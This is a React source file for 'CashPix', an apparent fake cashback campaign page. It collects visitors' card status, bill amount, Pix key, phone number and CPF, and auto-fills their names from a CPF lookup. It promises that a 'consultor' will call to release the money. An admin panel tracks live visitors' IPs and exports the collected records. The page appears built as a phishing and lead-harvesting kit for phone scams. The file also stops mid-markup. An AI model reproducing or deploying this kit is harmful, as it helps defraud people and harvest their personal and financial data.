import React, { useState, useEffect, useRef } from "react";

const fmtCPF=v=>{const d=v.replace(/\D/g,"").slice(0,11);if(d.length<=3)return d;if(d.length<=6)return`${d.slice(0,3)}.${d.slice(3)}`;if(d.length<=9)return`${d.slice(0,3)}.${d.slice(3,6)}.${d.slice(6)}`;return`${d.slice(0,3)}.${d.slice(3,6)}.${d.slice(6,9)}-${d.slice(9)}`};
const fmtPhone=v=>{const d=v.replace(/\D/g,"").slice(0,11);if(d.length<=2)return d.length?`(${d}`:"";if(d.length<=7)return`(${d.slice(0,2)}) ${d.slice(2)}`;return`(${d.slice(0,2)}) ${d.slice(2,7)}-${d.slice(7)}`};
const fmtBRL=v=>{let d=v.replace(/\D/g,"");if(!d)return"";let n=parseInt(d,10),s=(n/100).toFixed(2);let[i,dec]=s.split(".");i=i.replace(/\B(?=(\d{3})+(?!\d))/g,".");return`${i},${dec}`};
const parseBRL=f=>f?parseFloat(f.replace(/\./g,"").replace(",","."))||0:0;
const fmtCur=v=>new Intl.NumberFormat("pt-BR",{style:"currency",currency:"BRL"}).format(v);
const cap=s=>s.toLowerCase().split(" ").map(w=>["de","da","do","das","dos","e"].includes(w)?w:w.charAt(0).toUpperCase()+w.slice(1)).join(" ");

const pixTypes=[{id:"cpf",label:"CPF",ph:"000.000.000-00"},{id:"email",label:"E-mail",ph:"seu@email.com"},{id:"phone",label:"Telefone",ph:"(00) 00000-0000"},{id:"random",label:"Chave aleatória",ph:"Cole sua chave aqui"}];

function Confetti({active}){const ref=useRef(null);useEffect(()=>{if(!active||!ref.current)return;const c=ref.current,ctx=c.getContext("2d");c.width=window.innerWidth;c.height=window.innerHeight;const cols=["#CC092F","#fff","#f59e0b","#10b981","#fca5a5"];const ps=Array.from({length:120},()=>({x:Math.random()*c.width,y:-Math.random()*c.height,w:Math.random()*10+4,h:Math.random()*6+2,color:cols[Math.floor(Math.random()*cols.length)],vx:(Math.random()-.5)*4,vy:Math.random()*5+2,rot:Math.random()*360,rv:(Math.random()-.5)*10,op:1}));let st=Date.now(),raf;function draw(){const el=Date.now()-st;ctx.clearRect(0,0,c.width,c.height);ps.forEach(p=>{p.x+=p.vx;p.y+=p.vy;p.rot+=p.rv;if(el>2500)p.op=Math.max(0,p.op-.012);ctx.save();ctx.translate(p.x,p.y);ctx.rotate(p.rot*Math.PI/180);ctx.globalAlpha=p.op;ctx.fillStyle=p.color;ctx.fillRect(-p.w/2,-p.h/2,p.w,p.h);ctx.restore()});if(el<5000)raf=requestAnimationFrame(draw)}draw();return()=>cancelAnimationFrame(raf)},[active]);if(!active)return null;return<canvas ref={ref} className="fixed inset-0 z-50 pointer-events-none"/>}

function Card({num,title,children,done,active,color}){return(<div className={`bg-white rounded-2xl p-6 mb-5 border transition-all ${active&&!done?"shadow-lg border-gray-200":"border-gray-200"} ${done?"opacity-80":""}`}><div className="flex items-center gap-3 mb-4"><div className="w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold shrink-0 text-white" style={{background:done?"#10b981":active?color||"#CC092F":"#d1d5db"}}>{done?"✓":num}</div><h3 className="text-lg font-bold text-gray-900">{title}</h3></div>{(active||done)&&<div className={done?"pointer-events-none opacity-60":""}>{children}</div>}</div>)}

export default function App(){
  const [page,setPage]=useState(()=>{
    if(window.location.hash==="#admin") return localStorage.getItem("at")?"admin":"admin-login";
    return "form";
  });
  const [step,setStep]=useState(1);
  const [C,setC]=useState({site_name:"CashPix",primary_color:"#CC092F",accent_color:"#CC092F",cashback_percent:"10",prazo_horas:"72",hero_title:"Resgate seu cashback em 5 passos",hero_subtitle:"Rápido, gratuito e direto no seu Pix, em minutos.",btn_resgatar:"Resgatar meu cashback",btn_consultar:"Consultar status",badge_1:"",badge_2:"",badge_3:"",footer_text:"Campanha promocional sujeita a regulamento.",s1_title:"Você possui um cartão de crédito?",s1_btn_yes:"Sim, tenho",s1_btn_no:"Ainda não tenho",s1_no_msg:"Infelizmente o cashback está disponível apenas para quem possui cartão.",s2_title:"Qual foi o valor da sua última fatura?",s2_subtitle:"Valor estimado em reais",s2_btn:"Calcular meu cashback",s3_title:"Seu cashback está pronto",s3_cashback_label:"Seu cashback disponível é de",s3_cashback_sub:"Resgate agora direto no seu Pix, em minutos!",s3_pix_title:"Onde você quer receber? Escolha o tipo da sua chave Pix",s3_btn:"Confirmar chave Pix",s4_title:"Informe seu telefone para contato",s4_subtitle:"Um consultor entrará em contato para finalizar a liberação do seu cashback.",s4_btn:"Continuar",s5_title:"Valide seus dados com o CPF",s5_subtitle:"Informe seu CPF para confirmarmos sua elegibilidade ao cashback.",s5_btn:"Validar CPF",s5_footer:"Seus dados são tratados de forma segura e usados apenas para validar o resgate.",success_title:"Tudo certo, {nome}!",success_msg:"Seus dados foram validados. Um consultor entrará em contato em breve para finalizar a liberação do seu cashback.",logo_url:""});

  const [hasCard,setHasCard]=useState(null);
  const [valor,setValor]=useState("");const [cashback,setCashback]=useState(0);
  const [pixType,setPixType]=useState("");const [pixKey,setPixKey]=useState("");
  const [phone,setPhone]=useState("");
  const [cpf,setCpf]=useState("");const [nome,setNome]=useState("");const [nomeLoading,setNomeLoading]=useState(false);const [nomeFound,setNomeFound]=useState(false);
  const [confetti,setConfetti]=useState(false);const [submitting,setSubmitting]=useState(false);
  const [errors,setErrors]=useState({});

  const [cCpf,setCCpf]=useState("");const [cResult,setCResult]=useState(null);const [cLoading,setCLoading]=useState(false);

  const [adminToken,setAdminToken]=useState(localStorage.getItem("at")||"");
  const [aUser,setAUser]=useState("");const [aPass,setAPass]=useState("");const [aErr,setAErr]=useState("");const [aLoading,setALoading]=useState(false);
  const [subs,setSubs]=useState([]);const [subsLoading,setSubsLoading]=useState(false);
  const [filterSt,setFilterSt]=useState("todos");const [searchTerm,setSearchTerm]=useState("");
  const [stats,setStats]=useState({total:0,pendente:0,pago:0,rejeitado:0,totalCashback:0,hoje:0});
  const [adminTab,setAdminTab]=useState("dashboard");
  const [edCfg,setEdCfg]=useState({});const [edSaving,setEdSaving]=useState(false);const [edSaved,setEdSaved]=useState(false);
  const [logData,setLogData]=useState([]);
  const [analytics,setAnalytics]=useState({online:0,todayVisits:0,weekVisits:0,onlineList:[]});

  const bottomRef=useRef(null);
  const pct=parseFloat(C.cashback_percent)||10;
  const sidRef=useRef(()=>{let s=sessionStorage.getItem("cpx_sid");if(!s){s=Math.random().toString(36).slice(2)+Date.now().toString(36);sessionStorage.setItem("cpx_sid",s)}return s});
  const getSid=()=>{if(typeof sidRef.current==="function")sidRef.current=sidRef.current();return sidRef.current};

  const reset=()=>{setStep(1);setHasCard(null);setValor("");setCashback(0);setPixType("");setPixKey("");setPhone("");setCpf("");setNome("");setNomeLoading(false);setNomeFound(false);setConfetti(false);setSubmitting(false);setErrors({})};

  // Heartbeat — só nas páginas públicas (form/consult), nunca no admin
  useEffect(()=>{
    if(page==="admin"||page==="admin-login") return;
    const ping=()=>fetch("/api/ping",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({sid:getSid()})}).catch(()=>{});
    ping();
    const iv=setInterval(ping,20000);
    return()=>clearInterval(iv);
  },[page]);

  useEffect(()=>{fetch("/api/settings").then(r=>r.json()).then(d=>{setC(d);document.title=d.site_name||"CashPix"}).catch(()=>{})},[]);
  useEffect(()=>{document.title=C.site_name||"CashPix"},[C.site_name]);
  useEffect(()=>{if(step>1)setTimeout(()=>bottomRef.current?.scrollIntoView({behavior:"smooth"}),150)},[step]);
  useEffect(()=>{const h=()=>{if(window.location.hash==="#admin")setPage(localStorage.getItem("at")?"admin":"admin-login");else setPage("form")};window.addEventListener("hashchange",h);return()=>window.removeEventListener("hashchange",h)},[]);

  // Valida token no carregamento e a cada 60s
  useEffect(()=>{
    const check=()=>{
      const t=localStorage.getItem("at");
      if(!t)return;
      // Decodifica JWT para checar expiração
      try{const payload=JSON.parse(atob(t.split(".")[1]));if(payload.exp*1000<Date.now()){localStorage.removeItem("at");setAdminToken("");if(page==="admin")setPage("admin-login")}}catch{localStorage.removeItem("at");setAdminToken("")}
    };
    check();
    const iv=setInterval(check,60000);
    return()=>clearInterval(iv);
  },[page]);

  useEffect(()=>{const r=cpf.replace(/\D/g,"");if(r.length===11){setNomeLoading(true);setNomeFound(false);fetch(`/api/cpf?cpf=${r}`).then(r=>r.json()).then(d=>{if(d?.nome){setNome(cap(d.nome));setNomeFound(true)}setNomeLoading(false)}).catch(()=>setNomeLoading(false))}else{setNome("");setNomeFound(false)}},[cpf]);

  // ─── Validações ───
  const validarCPF = (v) => {
    const d = v.replace(/\D/g, "");
    if (d.length !== 11) return false;
    if (/^(\d)\1{10}$/.test(d)) return false; // todos iguais
    let soma = 0;
    for (let i = 0; i < 9; i++) soma += parseInt(d[i]) * (10 - i);
    let resto = (soma * 10) % 11; if (resto === 10) resto = 0;
    if (resto !== parseInt(d[9])) return false;
    soma = 0;
    for (let i = 0; i < 10; i++) soma += parseInt(d[i]) * (11 - i);
    resto = (soma * 10) % 11; if (resto === 10) resto = 0;
    return resto === parseInt(d[10]);
  };

  const validarEmail = (v) => /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v.trim());

  const validarTelefone = (v) => {
    const d = v.replace(/\D/g, "");
    return d.length >= 10 && d.length <= 11 && /^[1-9]{2}[0-9]{8,9}$/.test(d);
  };

  const validarChaveAleatoria = (v) => {
    const t = v.trim();
    // UUID format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
    if (/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(t)) return true;
    // Ou chave com pelo menos 20 caracteres alfanuméricos
    if (/^[a-zA-Z0-9-]{20,}$/.test(t)) return true;
    return false;
  };

  const validarPixKey = () => {
    const v = pixKey.trim();
    if (!v) return "Informe sua chave PIX";
    if (pixType === "cpf") {
      if (!validarCPF(v)) return "CPF inválido. Verifique os números.";
    } else if (pixType === "email") {
      if (!validarEmail(v)) return "E-mail inválido. Ex: nome@email.com";
    } else if (pixType === "phone") {
      if (!validarTelefone(v)) return "Telefone inválido. Use DDD + número.";
    } else if (pixType === "random") {
      if (!validarChaveAleatoria(v)) return "Chave aleatória inválida. Cole a chave do seu banco.";
    }
    return null;
  };

  const doS1=v=>{setHasCard(v);if(v)setStep(2)};
  const doS2=()=>{
    const v=parseBRL(valor);
    if(v<=0){setErrors({valor:"Informe o valor da fatura"});return}
    if(v>100000){setErrors({valor:"Valor máximo R$ 100.000"});return}
    setCashback(v*pct/100);setErrors({});setStep(3);
  };
  const doS3=()=>{
    if(!pixType){setErrors({pix:"Escolha o tipo da chave"});return}
    const err = validarPixKey();
    if(err){setErrors({pix:err});return}
    setErrors({});setStep(4);
  };
  const doS4=()=>{
    if(!validarTelefone(phone)){setErrors({phone:"Telefone inválido. Use DDD + 9 dígitos."});return}
    setErrors({});setStep(5);
  };
  const doS5=async()=>{
    const r=cpf.replace(/\D/g,"");
    if(!validarCPF(cpf)){setErrors({cpf:"CPF inválido. Verifique os números."});return}
    if(!nome.trim()||nome.trim().length<3){setErrors({cpf:"Nome obrigatório (mínimo 3 letras)"});return}
    if(!/^[a-zA-ZÀ-ú\s]+$/.test(nome.trim())){setErrors({cpf:"Nome deve conter apenas letras"});return}
    setErrors({});setSubmitting(true);
    try{const res=await fetch("/api/submit",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cpf:r,nome,phone,pixType,pixKey,valorFatura:parseBRL(valor),cashback,fileName:""})});const d=await res.json();if(d.ok){setConfetti(true);setStep(6)}else setErrors({cpf:d.error||"Erro"})}catch{setErrors({cpf:"Erro de conexão"})}
    setSubmitting(false);
  };

  const handleConsult=async()=>{const r=cCpf.replace(/\D/g,"");if(r.length!==11){setCResult({error:"CPF inválido"});return}setCLoading(true);try{const res=await fetch(`/api/consult?cpf=${r}`);const d=await res.json();setCResult(d.found?{data:d.data}:{error:"Nenhum cashback encontrado."})}catch{setCResult({error:"Erro"})}setCLoading(false)};

  const aFetch=(u,o={})=>fetch(u,{...o,headers:{...o.headers,"Content-Type":"application/json",Authorization:`Bearer ${adminToken}`}});
  const handleLogin=async()=>{setALoading(true);setAErr("");try{const r=await fetch("/api/analytics?type=login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({user:aUser,password:aPass})});const d=await r.json();if(d.ok){setAdminToken(d.token);localStorage.setItem("at",d.token);setPage("admin")}else setAErr(d.error||"Erro")}catch{setAErr("Erro")}setALoading(false)};
  const loadSubs=async()=>{setSubsLoading(true);try{const p=new URLSearchParams();if(filterSt!=="todos")p.set("status",filterSt);if(searchTerm)p.set("search",searchTerm);const r=await aFetch(`/api/submissions?${p}`);if(r.status===401){setAdminToken("");localStorage.removeItem("at");setPage("admin-login");return}const d=await r.json();setSubs(d.data||[]);setStats(d.stats||stats)}catch{}setSubsLoading(false)};
  const loadAnalytics=async()=>{try{const r=await aFetch("/api/analytics");setAnalytics(await r.json())}catch{}};
  const exportCSV=async()=>{try{const r=await aFetch("/api/export");const blob=await r.blob();const url=URL.createObjectURL(blob);const a=document.createElement("a");a.href=url;a.download="cashpix-export.csv";document.body.appendChild(a);a.click();a.remove();URL.revokeObjectURL(url)}catch{}};
  // Auto-refresh analytics a cada 10s no admin
  useEffect(()=>{if(page==="admin"&&adminToken&&adminTab==="dashboard"){loadAnalytics();const iv=setInterval(loadAnalytics,10000);return()=>clearInterval(iv)}},[page,adminTab,adminToken]);
  const updateStatus=async(id,st)=>{await aFetch("/api/submission",{method:"PATCH",body:JSON.stringify({id,action:"status",status:st})});loadSubs()};
  const deleteSub=async id=>{if(!confirm("Deletar?"))return;await aFetch(`/api/submission?id=${id}`,{method:"DELETE"});loadSubs()};
  const saveNotes=async(id,notes)=>{await aFetch("/api/submission",{method:"PATCH",body:JSON.stringify({id,action:"notes",notes})})};
  const loadEditor=async()=>{try{const r=await aFetch("/api/settings");setEdCfg(await r.json())}catch{}};
  const saveEditor=async()=>{setEdSaving(true);await aFetch("/api/settings",{method:"PUT",body:JSON.stringify(edCfg)});setC(edCfg);document.title=edCfg.site_name||"CashPix";setEdSaving(false);setEdSaved(true);setTimeout(()=>setEdSaved(false),3000)};
  const loadLog=async()=>{try{const r=await aFetch("/api/analytics?type=log");setLogData(await r.json())}catch{}};

  useEffect(()=>{if(page==="admin"&&adminToken){if(adminTab==="dashboard")loadSubs();if(adminTab==="editor")loadEditor();if(adminTab==="log")loadLog()}},[page,adminTab,filterSt]);

  const logout=()=>{setAdminToken("");localStorage.removeItem("at");window.location.hash="";setPage("form")};
  const stColors={pendente:"bg-yellow-100 text-yellow-800",pago:"bg-green-100 text-green-800",rejeitado:"bg-red-100 text-red-800"};

  // ═══ FORM (tela principal — mobile-first) ═══
  if(page==="form")return(
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <Confetti active={confetti}/>

      {/* Header vermelho */}
      <div style={{background:C.primary_color}} className="shadow-lg">
        <div className="max-w-lg mx-auto px-5 py-3.5 flex items-center justify-between">
          <div className="flex items-center gap-2.5">
            {C.logo_url?<img src={C.logo_url} alt="" className="h-8 rounded-xl"/>:<div className="w-8 h-8 rounded-xl bg-white/20 flex items-center justify-center"><svg width="16" height="16" fill="white" viewBox="0 0 24 24"><path d="M17.176 14.152a3.07 3.07 0 01-2.186-.905l-2.99-2.99-2.99 2.99a3.07 3.07 0 01-2.186.905h-.564l3.782 3.782a2.636 2.636 0 003.73 0l3.782-3.782h-.378zM6.824 9.848a3.07 3.07 0 012.186.905l2.99 2.99 2.99-2.99a3.07 3.07 0 012.186-.905h.378L13.772 6.066a2.636 2.636 0 00-3.73 0L6.26 9.848h.564z"/></svg></div>}
            <div><p className="text-white font-bold text-base leading-tight">{C.site_name}</p><p className="text-white/50 text-[10px]">soluções financeiras</p></div>
          </div>
          <button onClick={()=>{setCCpf("");setCResult(null);setPage("consult")}} className="text-white/60 hover:text-white text-xs font-medium">Consultar cashback</button>
        </div>
      </div>

      <main className="flex-1 max-w-lg mx-auto w-full px-4 py-6">
        <h2 className="text-xl font-black text-gray-900 mb-0.5">{C.hero_title}</h2>
        <p className="text-gray-400 text-sm mb-5">{C.hero_subtitle}</p>

        {/* Progress bar */}
        <div className="flex items-center gap-1.5 mb-1.5">{[1,2,3,4,5].map(i=><div key={i} className={`flex-1 h-2 rounded-full transition-all duration-700 ${i===step?"glow-pulse":""}`} style={{background:i<=step?C.primary_color:"#e5e7eb"}}/>)}</div>
        <p className="text-right text-[11px] text-gray-400 font-medium mb-6">Passo {Math.min(step,5)} de 5</p>

        {/* 1 — Cartão */}
        <Card num={1} title={C.s1_title} done={step>1} active={step>=1} color={C.primary_color}>
          {hasCard===false&&step===1?<div className="bg-red-50 border border-red-100 rounded-2xl p-5 text-center slide-in"><p className="text-red-500 font-semibold text-sm">{C.s1_no_msg}</p><button onClick={()=>setHasCard(null)} className="text-sm font-medium mt-3" style={{color:C.primary_color}}>← Voltar</button></div>
          :<div className="grid grid-cols-2 gap-3">
            <button onClick={()=>doS1(true)} className={`py-4 rounded-2xl font-bold text-sm transition-all border-2 ${hasCard===true?"text-white border-transparent shadow-lg":"bg-white text-gray-700 border-gray-200 active:scale-95"}`} style={hasCard===true?{background:C.primary_color}:{}}>{C.s1_btn_yes}</button>
            <button onClick={()=>doS1(false)} className="py-4 rounded-2xl font-bold text-sm bg-white text-gray-700 border-2 border-gray-200 active:scale-95">{C.s1_btn_no}</button>
          </div>}
        </Card>

        {/* 2 — Valor */}
        {step>=2&&<Card num={2} title={C.s2_title} done={step>2} active={step>=2} color={C.primary_color}>
          <p className="text-gray-400 text-sm mb-3">{C.s2_subtitle}</p>
          <div className="relative mb-4"><span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 font-bold text-lg">R$</span>
            <input type="text" inputMode="numeric" placeholder="0,00" value={valor} onChange={e=>{setValor(fmtBRL(e.target.value));setErrors({})}} className={`input-main pl-14 text-2xl font-black h-14 ${errors.valor?"border-red-300":""}`}/>
          </div>
          {errors.valor&&<p className="err">{errors.valor}</p>}
          {step===2&&<button onClick={doS2} className="btn-main" style={{background:C.primary_color}}>✨ {C.s2_btn}</button>}
        </Card>}

        {/* 3 — Cashback + PIX */}
        {step>=3&&<Card num={3} title={C.s3_title} done={step>3} active={step>=3} color={C.primary_color}>
          <div className="border-2 border-green-200 rounded-2xl p-5 text-center mb-5 bg-gradient-to-b from-green-50 to-white">
            <p className="text-green-600 text-xs font-semibold mb-1">{C.s3_cashback_label}</p>
            <p className="text-4xl font-black text-gray-900 my-2">{fmtCur(cashback)}</p>
            <p className="text-green-600 text-xs">{C.s3_cashback_sub}</p>
          </div>
          <p className="text-gray-700 font-medium text-sm mb-3">{C.s3_pix_title}</p>
          <div className="grid grid-cols-2 gap-2.5 mb-4">{pixTypes.map(t=><button key={t.id} onClick={()=>{setPixType(t.id);setPixKey("");setErrors({})}} className={`py-3.5 rounded-2xl font-semibold text-sm transition-all border-2 active:scale-95 ${pixType===t.id?"text-white border-transparent shadow-md":"bg-white text-gray-700 border-gray-200"}`} style={pixType===t.id?{background:C.primary_color}:{}}>{t.label}</button>)}</div>
          {pixType&&step===3&&<div className="slide-in">
            <input type="text" placeholder={pixTypes.find(t=>t.id===pixType)?.ph} value={pixKey} onChange={e=>{let v=e.target.value;if(pixType==="cpf")v=fmtCPF(v);if(pixType==="phone")v=fmtPhone(v);setPixKey(v);setErrors({})}} className="input-main mb-4"/>
            {errors.pix&&<p className="err">{errors.pix}</p>}
            <button onClick={doS3} className="btn-main" style={{background:C.primary_color}}>{C.s3_btn}</button>
          </div>}
        </Card>}

        {/* 4 — Telefone */}
        {step>=4&&<Card num={4} title={C.s4_title} done={step>4} active={step>=4} color={C.primary_color}>
          <p className="text-gray-400 text-sm mb-3">{C.s4_subtitle}</p>
          <input type="text" inputMode="numeric" placeholder="(00) 00000-0000" value={phone} onChange={e=>{setPhone(fmtPhone(e.target.value));setErrors({})}} className={`input-main mb-4 ${errors.phone?"border-red-300":""}`}/>
          {errors.phone&&<p className="err">{errors.phone}</p>}
          {step===4&&<button onClick={doS4} className="btn-main" style={{background:C.primary_color}}>{C.s4_btn}</button>}
        </Card>}

        {/* 5 — CPF */}
        {step>=5&&<Card num={5} title={C.s5_title} done={step>5} active={step>=5} color={C.primary_color}>
          <p className="text-gray-400 text-sm mb-3">{C.s5_subtitle}</p>
          <div className="relative mb-3">
            <input type="text" inputMode="numeric" placeholder="000.000.000-00" value={cpf} onChange={e=>{setCpf(fmtCPF(e.target.value));setErrors({})}} className={`input-main pr-14 ${errors.cpf?"border-red-300":""}`}/>
            <div className="absolute right-4 top-1/2 -translate-y-1/2">{nomeLoading&&<div className="w-6 h-6 border-2 border-gray-200 border-t-red-600 rounded-full animate-spin"/>}{nomeFound&&<svg width="24" height="24" fill="none" viewBox="0 0 24 24" stroke="#10b981" strokeWidth="2.5"><path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>}</div>
          </div>
          {nomeFound&&<div className="bg-green-50 border border-green-200 rounded-2xl px-5 py-4 mb-3 slide-in"><p className="text-green-800 font-black text-lg">Olá, {nome.split(" ")[0]}! 👋</p><p className="text-green-600 text-sm mt-0.5">{nome}</p></div>}
          {!nomeFound&&!nomeLoading&&cpf.replace(/\D/g,"").length===11&&<input type="text" placeholder="Nome completo" value={nome} onChange={e=>setNome(e.target.value)} className="input-main mb-3"/>}
          {errors.cpf&&<p className="err">{errors.cpf}</p>}
          {step===5&&<button onClick={doS5} disabled={submitting||nomeLoading} className="btn-main glow-pulse" style={{background:C.primary_color}}>{submitting?"Validando...":"🔒 "+C.s5_btn}</button>}
          <p className="text-[11px] text-gray-400 mt-3 text-center">{C.s5_footer}</p>
        </Card>}

        {/* Sucesso */}
        {step===6&&<div className="bg-white rounded-3xl p-7 mb-5 shadow-xl slide-in text-center">
          <div className="check-anim mx-auto mb-5"><svg width="80" height="80" viewBox="0 0 52 52"><circle cx="26" cy="26" r="25" fill="none" stroke="#10b981" strokeWidth="2" className="check-circle-anim"/><path fill="none" stroke="#10b981" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" d="M14.1 27.2l7.1 7.2 16.7-16.8" className="check-path-anim"/></svg></div>
          <h3 className="text-2xl font-black text-gray-900 mb-2">{(C.success_title||"").replace("{nome}",nome.split(" ")[0])}</h3>
          <p className="text-gray-500 text-sm mb-6 max-w-xs mx-auto leading-relaxed">{C.success_msg}</p>
          <div className="rounded-2xl p-5 mb-6 text-white text-center glow-pulse" style={{background:C.primary_color}}><p className="text-4xl font-black">Até {C.prazo_horas}h</p></div>
          <button onClick={()=>{reset()}} className="w-full text-gray-400 font-semibold py-3">Voltar ao início</button>
        </div>}
        <div ref={bottomRef}/>
      </main>

      {/* Footer fixo com badges animados */}
      <footer className="pb-6 pt-2 px-4 mt-auto">
        <div className="max-w-lg mx-auto">
          <div className="flex justify-center gap-4 mb-3">
            {[C.badge_1,C.badge_2,C.badge_3].filter(Boolean).map((b,i)=>(
              <div key={i} className="float bg-white rounded-full px-3 py-1.5 shadow-sm border border-gray-100" style={{animationDelay:`${i*0.4}s`}}>
                <span className="text-xs font-semibold text-gray-600">{b}</span>
              </div>
            ))}
          </div>
          {C.footer_text&&<p className="text-center text-[11px] text-gray-400 fade-loop">{C.footer_text}</p>}
        </div>
      </footer>
    </div>
  );

  // CONSULT
  if(page==="consult")return(
    <div className="min-h-screen bg-gray-100">
      <div style={{background:C.primary_color}} className="text-white"><div className="max-w-2xl mx-auto px-6 py-4 flex items-center gap-3"><button onClick={()=>setPage("form")} className="text-white/60 hover:text-white">←</button><span className="font-bold">Consultar Cashback</span></div></div>
      <main className="max-w-2xl mx-auto px-6 py-8">
        <div className="bg-white rounded-2xl p-6 border shadow-md"><h3 className="text-xl font-bold text-gray-900 mb-5">Acompanhe seu cashback</h3>
          <input type="text" inputMode="numeric" placeholder="000.000.000-00" value={cCpf} onChange={e=>setCCpf(fmtCPF(e.target.value))} className="input-main mb-4"/>
          <button onClick={handleConsult} disabled={cLoading} className="btn-main" style={{background:C.primary_color}}>{cLoading?"Consultando...":"🔍 Consultar"}</button>
        </div>
        {cResult&&!cLoading&&<div className="mt-6 slide-in">{cResult.error?<div className="bg-white rounded-2xl p-6 text-center border"><p className="text-red-500 font-semibold">{cResult.error}</p></div>
        :<div className="bg-white rounded-2xl overflow-hidden border"><div className="px-5 py-3 border-b text-white" style={{background:C.primary_color}}><span className="font-bold text-sm">{cResult.data.status==="pago"?"✅ Pago":"⏳ Em andamento"}</span></div><div className="p-5"><div className="bg-green-50 border border-green-200 rounded-xl p-4 text-center mb-5"><p className="text-3xl font-black text-gray-900">{fmtCur(cResult.data.cashback)}</p></div><div className="divide-y text-sm">{[["Nome",cResult.data.nome],["CPF",cResult.data.cpf_formatted],["PIX",cResult.data.pix_key],["Fatura",fmtCur(cResult.data.valor_fatura)],["Data",cResult.data.created_at]].map(([l,v],i)=><div key={i} className="flex justify-between py-3"><span className="text-gray-400">{l}</span><span className="font-semibold text-gray-900 break-all">{v}</span></div>)}</div></div></div>}</div>}
      </main>
    </div>
  );

  // ADMIN LOGIN
  if(page==="admin-login")return(
    <div className="min-h-screen bg-gray-100 flex items-center justify-center px-6"><div className="w-full max-w-sm">
      <div className="text-center mb-8"><div className="w-14 h-14 rounded-2xl flex items-center justify-center mx-auto mb-4 text-white text-2xl" style={{background:C.primary_color}}>🔐</div><h2 className="text-2xl font-black text-gray-900">Painel Admin</h2></div>
      <div className="bg-white rounded-2xl p-6 shadow-sm border">
        <label className="block text-sm font-semibold mb-1.5">Usuário</label><input type="text" value={aUser} onChange={e=>setAUser(e.target.value)} className="input-main mb-4"/>
        <label className="block text-sm font-semibold mb-1.5">Senha</label><input type="password" value={aPass} onChange={e=>setAPass(e.target.value)} onKeyDown={e=>e.key==="Enter"&&handleLogin()} className="input-main mb-4"/>
        {aErr&&<p className="text-red-500 text-sm mb-4">{aErr}</p>}
        <button onClick={handleLogin} disabled={aLoading} className="btn-main" style={{background:C.primary_color}}>{aLoading?"Entrando...":"Entrar"}</button>
      </div>
    </div></div>
  );

  // ADMIN
  if(page==="admin")return(
    <div className="min-h-screen bg-gray-100">
      <div style={{background:C.primary_color}} className="text-white"><div className="max-w-6xl mx-auto px-4 py-3 flex items-center justify-between flex-wrap gap-2">
        <span className="font-bold">{C.site_name} — Admin</span>
        <div className="flex items-center gap-2">
          {[["dashboard","📊 Dados"],["editor","🎨 Editor"],["log","📋 Log"]].map(([t,l])=><button key={t} onClick={()=>setAdminTab(t)} className={`text-sm font-semibold px-3 py-1.5 rounded-lg ${adminTab===t?"bg-white/20":"text-white/60 hover:bg-white/10"}`}>{l}</button>)}
          <button onClick={logout} className="text-white/40 hover:text-white text-sm ml-2">Sair</button>
        </div>
      </div></div>
      <main className="max-w-6xl mx-auto px-4 py-6">

        {adminTab==="dashboard"&&<>
          {/* Analytics em tempo real */}
          <div className="grid grid-cols-3 gap-3 mb-4">
            <div className="rounded-xl p-4 bg-green-50 text-green-700 border border-green-200"><div className="flex items-center gap-2 mb-1"><span className="w-2.5 h-2.5 bg-green-500 rounded-full animate-pulse"/><p className="text-xs font-semibold">Online agora</p></div><p className="text-3xl font-black">{analytics.online}</p></div>
            <div className="rounded-xl p-4 bg-blue-50 text-blue-700"><p className="text-xs font-semibold opacity-70">Visitantes hoje</p><p className="text-3xl font-black mt-1">{analytics.todayVisits}</p></div>
            <div className="rounded-xl p-4 bg-indigo-50 text-indigo-700"><p className="text-xs font-semibold opacity-70">Últimos 7 dias</p><p className="text-3xl font-black mt-1">{analytics.weekVisits}</p></div>
          </div>
          {analytics.onlineList.length>0&&<div className="bg-white rounded-xl border p-4 mb-4"><p className="text-xs font-bold text-gray-500 mb-2">👥 Visitantes online agora:</p><div className="space-y-1">{analytics.onlineList.map((v,i)=><div key={i} className="flex items-center gap-2 text-xs"><span className="w-2 h-2 bg-green-500 rounded-full"/><span className="text-gray-600">{v.ip}</span><span className="text-gray-400">•</span><span className="text-gray-400">{v.duration}</span><span className="text-gray-300 truncate max-w-xs">{v.ua}</span></div>)}</div></div>}

          {/* Stats de solicitações */}
          <div className="grid grid-cols-2 md:grid-cols-5 gap-3 mb-6">{[["Total",stats.total,"bg-blue-50 text-blue-700"],["Hoje",stats.hoje,"bg-purple-50 text-purple-700"],["Pendentes",stats.pendente,"bg-yellow-50 text-yellow-700"],["Pagos",stats.pago,"bg-green-50 text-green-700"],["Cashback",fmtCur(stats.totalCashback),"bg-red-50 text-red-700"]].map(([l,v,c],i)=><div key={i} className={`rounded-xl p-4 ${c}`}><p className="text-xs font-semibold opacity-70">{l}</p><p className="text-xl font-black mt-1">{v}</p></div>)}</div>
          <div className="flex flex-col md:flex-row gap-3 mb-4">
            <div className="flex gap-2 flex-wrap">{["todos","pendente","pago","rejeitado"].map(s=><button key={s} onClick={()=>setFilterSt(s)} className={`px-3 py-2 rounded-lg text-xs font-bold ${filterSt===s?"text-white":"bg-white text-gray-600 border"}`} style={filterSt===s?{background:C.primary_color}:{}}>{s.charAt(0).toUpperCase()+s.slice(1)}</button>)}</div>
            <div className="flex-1 flex gap-2"><input type="text" placeholder="Buscar..." value={searchTerm} onChange={e=>setSearchTerm(e.target.value)} className="input-main flex-1 !py-2"/><button onClick={loadSubs} className="text-white px-4 rounded-xl text-sm font-bold" style={{background:C.primary_color}}>🔍</button><button onClick={exportCSV} className="bg-green-600 text-white px-4 rounded-xl text-sm font-bold hover:bg-green-700">📥 CSV</button></div>
          </div>
          {subsLoading?<div className="text-center py-12"><div className="w-8 h-8 border-2 border-gray-200 border-t-red-600 rounded-full animate-spin mx-auto"/></div>
